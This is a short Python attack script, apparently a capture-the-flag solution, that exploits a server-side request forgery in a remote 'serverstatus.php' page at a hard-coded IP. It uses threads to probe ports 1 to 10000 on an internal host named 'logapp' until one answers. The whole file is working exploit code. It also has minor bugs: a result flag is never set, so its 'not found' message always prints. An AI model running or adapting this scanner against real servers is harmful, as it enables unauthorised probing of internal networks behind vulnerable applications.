import requests
from bs4 import BeautifulSoup
import threading

url = 'http://15.165.100.234:8380/serverstatus.php'

port_ranges = [(1, 1000), (1001, 2000), (2001, 3000), (3001, 4000), (4001, 5000),
               (5001, 6000), (6001, 7000), (7001, 8000), (8001, 9000), (9001, 10000)]

found_h1_tag = None
lock = threading.Lock()

exit_flag = False

def scan_ports(start, end):
    global found_h1_tag
    global exit_flag

    for i in range(start, end + 1):
        if exit_flag:
            return 

        data = {
            'serveraddress': f'http://logapp:{i}/',
            'lookupkey': 'dtnet2627'
        }
        response = requests.post(url, data=data)
        soup = BeautifulSoup(response.content, "html.parser")
        fail_text = "Lookup Fail!"
        if fail_text in soup.get_text():
            print(i)
        else:
            with lock:
                found_fail_text = True
                print(f"Port {i} - Found: {i}")
                exit_flag = True
                return

threads = []
for start, end in port_ranges:
    thread = threading.Thread(target=scan_ports, args=(start, end))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

if found_h1_tag is None:
    print("결과를 찾을 수 없습니다.")
